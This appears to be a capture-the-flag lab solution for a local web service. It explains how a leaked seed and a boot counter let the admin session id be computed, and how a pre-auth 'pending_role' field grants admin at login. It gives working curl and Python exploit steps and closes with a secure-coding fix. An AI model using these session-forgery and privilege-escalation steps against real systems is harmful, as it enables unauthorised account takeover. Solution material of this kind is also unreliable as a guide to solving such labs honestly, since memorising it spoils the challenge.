# w18 Grid Maze :: solution

## Root cause

`app/server.py`, `new_session_id()`:

```python
def new_session_id(counter: int) -> str:
    """The id-generating code. counter + container-fixed seed, weak hash."""
    return "gs_" + hashlib.md5(f"{SESSION_SEED}:{counter}".encode()).hexdigest()[:20]
```

A session id is a **small monotonic counter** mixed with a **container-fixed
seed** and truncated MD5. Neither ingredient is secret:

```python
SESSION_SEED = "gm-" + secrets.token_hex(4)   # random per container ...
```

...and then published, unauthenticated, by the liveness endpoint:

```python
if path == "/api/health":
    return self._json(200, {
        ...
        "session_seed": SESSION_SEED,
        "id_scheme": "gs_ + md5(session_seed + ':' + counter)[:20]",
    })
```

The counter is the only remaining unknown, and it is *small and reset on boot*:

```python
_counter = 0        # resets on every boot
```

`main()` spends the first two values on the service's own accounts, and it
creates the admin one first:

```python
def _boot_accounts():
    create_session("maze-bot-admin", role="admin")   # counter 1
    create_session("maze-bot-guest", role="player")  # counter 2
```

So the admin id is `new_session_id(1)` — computable from `/api/health` alone.
There is nothing to guess: the counter is 1, not a range.

The second, independent weakness is the **role bleed** across the auth
boundary:

```python
if path == "/api/session/preauth":
    want = str(obj.get("pending_role") or "player")
    nsid, sess = create_session("preauth-...", role="player", pending_role=want)
```

```python
pending = None
sid, _ = self._current()
if sid and sid in SESSIONS:
    pending = SESSIONS[sid].get("pending_role")
...
nsid, sess = create_session(user, role=pending or "player", pending_role=pending)
```

A value supplied *before* authentication is stored on an anonymous session and
then honoured as the authenticated role. The role is read from the session
record instead of being bound to the account at login.

## Recon

The landing page states the id is derived from a boot counter plus a container
seed, and that `/api/health` reports the seed. Confirm:

```bash
curl -s http://localhost:30018/api/health
# {"service":"grid-maze","lab":"w18","version":"1.18.0","uptime":7,
#  "sessions":2,"session_seed":"gm-1f2e3d4c",
#  "id_scheme":"gs_ + md5(session_seed + ':' + counter)[:20]",
#  "note":"seed reported so operators can reproduce a session id"}
```

`sessions: 2` with `uptime: 7` is the tell: **two** sessions already exist
before you have logged in. Those are the boot accounts, and they occupied
counters 1 and 2. Note the admin id is not listed:

```bash
curl -s http://localhost:30018/api/sessions
# {"total":2,"admins":1,"players":1,"note":"...the admin session exists at boot"}
```

A player session exists, so the guard can be seen working normally:

```bash
curl -s -X POST http://localhost:30018/api/login \
  -H 'content-type: application/json' -d '{"user":"probe"}'
# {"sid":"gs_...","user":"probe","role":"player","carried":false}

curl -s "http://localhost:30018/api/flag?sid=gs_..."
# {"error":"the exit is on the admin grid","your_role":"player","required_role":"admin"}
```

## Deriving the admin session

`GET /api/health` gives the seed. The boot order gives the counter. Compute the
id locally — no requests, no guessing:

```bash
SEED=$(curl -s http://localhost:30018/api/health | python -c 'import json,sys;print(json.load(sys.stdin)["session_seed"])')
python -c "import hashlib,sys; s=sys.argv[1]; print('gs_'+hashlib.md5(f'{s}:1'.encode()).hexdigest()[:20])" "$SEED"
# gs_7c1a4ff02d3b6e19a8c0
```

Verify the derivation against a session you *own* before trusting it. Log in,
read your own counter from `/api/me`, and reproduce your own id:

```bash
MY=$(curl -s -X POST http://localhost:30018/api/login -H 'content-type: application/json' -d '{"user":"recon"}' | python -c 'import json,sys;print(json.load(sys.stdin)["sid"])')
curl -s "http://localhost:30018/api/me?sid=$MY"
# {"sid":"gs_...","user":"recon","role":"player","counter":3}
```

The counter in `/api/me` is the one that was hashed to make `$MY`. Reproduce it
with the seed and the formula and you have proved the scheme, so counter 1 must
belong to whoever was created first.

## Exploit

Present the derived id. The service accepts `?sid=` as well as the cookie, so
curl needs nothing else:

```bash
SEED=$(curl -s http://localhost:30018/api/health | python -c 'import json,sys;print(json.load(sys.stdin)["session_seed"])')
ADMIN=$(python -c "import hashlib,sys; s=sys.argv[1]; print('gs_'+hashlib.md5(f'{s}:1'.encode()).hexdigest()[:20])" "$SEED")

curl -s "http://localhost:30018/api/me?sid=$ADMIN"
# {"sid":"gs_...","user":"maze-bot-admin","role":"admin","counter":1}

curl -s "http://localhost:30018/api/flag?sid=$ADMIN"
# {"grid":"admin","user":"maze-bot-admin","flag":"hex4b0t{...}"}
```

Or run the bundled script:

```bash
python solution/exploit.py
# [*] target http://localhost:30018
# [*] service grid-maze v1.18.0 (lab w18)
# [*] health leaks session_seed = 'gm-1f2e3d4c'
# [*] id scheme: gs_ + md5(session_seed + ':' + counter)[:20]
# [*] admin account is created first at boot -> counter 1
# [*] derived admin sid = gs_7c1a4ff02d3b6e19a8c0
# [*] /api/me -> 200 role=admin user=maze-bot-admin
# [*] /api/flag -> 200
#
# [+] FLAG: hex4b0t{verifytest123456}
```

### The other route: the pre-auth role bleed

Independently of the id, the role can be requested before authenticating:

```bash
# 1. open a temporary session and ask for admin
curl -s -c /tmp/jar -X POST http://localhost:30018/api/session/preauth \
  -H 'content-type: application/json' -d '{"pending_role":"admin"}'
# {"sid":"gs_...","role":"player","pending_role":"admin",
#  "note":"role preference recorded for the next /api/login"}

# 2. log in with that cookie - the new real session comes back as admin
curl -s -b /tmp/jar -c /tmp/jar -X POST http://localhost:30018/api/login \
  -H 'content-type: application/json' -d '{"user":"bleed"}'
# {"sid":"gs_...","user":"bleed","role":"admin","carried":true}

# 3. the exit opens
curl -s -b /tmp/jar http://localhost:30018/api/flag
# {"grid":"admin","user":"bleed","flag":"hex4b0t{...}"}
```

## Why the counter is not really the problem

Even if the boot accounts did not exist, the id would still be weak: the
counter is the *only* variable, it is tiny, and it resets on boot. A session id
must carry its own entropy, not borrow it from a public seed. Publishing the
seed "for operators" turns a 32-bit-ish id space into a one-line computation,
and the truncation to 20 hex chars of MD5 does not add entropy — MD5 of a
14-bit counter is 14 bits of input.

## The fix

1. **Session ids must be unpredictable.** They are bearer tokens; use
   `secrets.token_urlsafe(32)` and store the mapping server-side. Never derive
   a token from a counter, a timestamp, or a hash of a value the client can
   read — a seeded hash is only as strong as the seed's secrecy, and here the
   seed is an endpoint.
2. **Do not publish key material on a liveness endpoint.** `/api/health` is
   typically unauthenticated and often logged; it is the wrong place for
   anything that participates in authentication.
3. **Bind the role at authentication, server-side.** `login` must look up the
   account's role from its own record and never read a role from the session
   record or the request. The pre-auth session should carry an opaque
   continuation token and nothing that influences authorization.
4. **Never carry a client-supplied role across the auth boundary.** If a role
   preference is genuinely needed, treat it as a *request* validated against
   what the authenticated account may assume — not as a value copied verbatim
   into the new session.

```python
def login(user):
    sid = secrets.token_urlsafe(32)          # unguessable
    role = ACCOUNTS[user]["role"]            # bound server-side, not from input
    SESSIONS[sid] = {"user": user, "role": role}
    return sid
```

## Flag

Injected at runtime into `W0B_FLAG`. There is no static value to hardcode. The
seed is regenerated per container, so the derived id changes on every restart
while the scheme does not.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
